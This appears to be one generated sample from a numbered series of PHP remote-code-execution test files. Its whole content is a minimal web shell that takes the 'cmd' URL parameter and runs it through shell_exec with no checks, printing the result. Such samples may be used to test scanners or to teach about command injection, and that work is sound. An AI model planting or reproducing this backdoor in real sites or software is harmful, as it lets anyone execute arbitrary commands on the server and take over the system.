<?php
// RCE test variation #809
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>